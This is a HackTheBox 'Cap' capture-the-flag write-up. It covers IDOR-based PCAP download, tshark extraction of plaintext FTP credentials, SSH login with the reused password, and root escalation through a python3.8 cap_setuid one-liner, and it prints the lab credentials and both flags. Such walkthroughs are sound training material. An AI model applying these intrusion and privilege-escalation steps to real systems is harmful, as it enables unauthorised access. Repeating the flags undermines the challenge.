# HackTheBox — Cap (Easy) Writeup

## Recon

An initial Nmap scan of the target revealed three open ports:

```bash
nmap -sC -sV 10.129.19.233
```

| Port | State | Service |
|------|-------|---------|
| 21/tcp | open | vsftpd 3.0.3 |
| 22/tcp | open | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 |
| 80/tcp | open | Gunicorn — Security Dashboard |

Anonymous FTP login was attempted but failed. Port 80 exposed a web application titled "Security Dashboard" with three endpoints in the navigation menu:

- `/capture` — Security Snapshot (5-second PCAP + analysis), always redirects to `/data/1`
- `/ip` — displays `ifconfig` output
- `/netstat` — displays active network connections

```bash
curl -s http://10.129.19.233/capture -v
# → 302 redirect to /data/1
curl -s http://10.129.19.233/data/0
# → page with Download button pointing to /download/0
```

**IDOR discovered:** `/capture` always redirects to `/data/1`, but manually requesting `/data/0` reveals a download button for a previously stored PCAP file.

## Exploitation

**Attack vector:** IDOR (Insecure Direct Object Reference) → PCAP download → plaintext FTP credentials

By downloading the PCAP at `/download/0` and analysing it with `tshark`, FTP credentials were found in plaintext:

```bash
curl -s http://10.129.19.233/download/0 -o capture.pcap
tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
```

**Output:**
```
USER    nathan
PASS    Buck3tH4TF0RM3!
```

These credentials were reused for SSH:

```bash
ssh nathan@10.129.19.233
# password: Buck3tH4TF0RM3!
```

**User flag:** `2874475212d535da1ca01f207b3a6939`

## Privilege Escalation

Enumeration of Linux capabilities revealed a misconfigured Python binary:

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`python3.8` has the `cap_setuid` capability, which allows the process to change its own UID to 0 (root) without requiring a SUID binary.

```bash
python3.8 -c 'import os; os.setuid(0); os.system("bash")'
```

```
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

**Root flag:** `006b90cfdd1f951eb31fe3278eb85847`

## Lessons Learned

1. **IDOR in sequential numeric IDs:** Always test low-numbered IDs (0, 1, 2) on `/data/N` or `/download/N` endpoints. Sequential IDs without access control expose data belonging to other users or sessions.

2. **FTP transmits credentials in plaintext:** Any PCAP containing FTP traffic will expose credentials directly. `tshark -Y "ftp"` extracts USER/PASS in seconds. Never use FTP where TLS-protected alternatives exist.

3. **Linux Capabilities (`getcap -r /`) is essential in privilege escalation enumeration.** `cap_setuid` on an interpreter (Python, Perl, Ruby) is immediately exploitable with `os.setuid(0)`. This is documented on GTFOBins.

4. **Machine name as a hint:** "Cap" references both the PCAP capture file and Linux Capabilities — a deliberate double meaning pointing to both attack vectors.
